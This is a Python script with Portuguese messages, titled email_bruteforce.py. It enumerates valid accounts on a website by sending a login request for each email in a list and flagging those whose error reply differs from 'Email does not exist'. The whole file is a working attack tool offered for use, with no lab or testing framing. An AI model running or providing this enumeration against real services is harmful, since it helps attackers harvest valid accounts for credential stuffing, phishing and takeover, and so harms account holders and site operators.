import requests
from colorama import Fore, Style
import sys
import json
import os

def load_headers_from_file(header_file):
    try:
        with open(header_file, 'r') as file:
            headers = json.load(file)
        return headers
    except (FileNotFoundError, json.JSONDecodeError):
        print()
        print(Fore.RED + "ERROR: Headers ou Arquivo Inválido!" + Style.RESET_ALL)
        sys.exit(1)

def check_email(email, headers, url):
    data = {
        'username': email,
        'password': 'password',
        'function': 'login'
    }
    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file, headers, url):
    if not os.path.exists(email_file):
        print()
        print(Fore.RED + f"ERROR: O Arquivo '{email_file}' não foi Encontrado!" + Style.RESET_ALL)
        sys.exit(1)
    print()
    print(Fore.YELLOW + "Inicializando Força Bruta" + Style.RESET_ALL)
    print()
    valid_emails = []
    invalid_error = "Email does not exist"
    
    with open(email_file, 'r') as file:
        emails = file.readlines()

    total_emails = len(emails)

    for index, email in enumerate(emails):
        email = email.strip()
        if email:
            response_json = check_email(email, headers, url)
            progress = int(((index + 1) / total_emails) * 100)
            progress_bar = "■" * (progress // 2) + " " * (50 - progress // 2)

            print(f"\rProgresso: [{progress_bar}] {progress}% ", end="")

            if response_json.get('status') == 'error' and invalid_error in response_json.get('message', ''):
                print(Fore.RED + "[0]" + Style.RESET_ALL, end=" ")
            else:
                print(Fore.GREEN + f"[1] {email}" + Style.RESET_ALL, end=" ")
                valid_emails.append(email)

    print("\nEmails válidos encontrados:")
    for valid_email in valid_emails:
        print(Fore.GREEN + " " + valid_email + Style.RESET_ALL)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(Fore.RED + "Uso: python3 email_bruteforce.py <arquivo_headers.json> <arquivo_de_emails> <url>" + Style.RESET_ALL)
        sys.exit(1)

    header_file = sys.argv[1]
    email_file = sys.argv[2]
    url = sys.argv[3]

    headers = load_headers_from_file(header_file)
    enumerate_emails(email_file, headers, url)
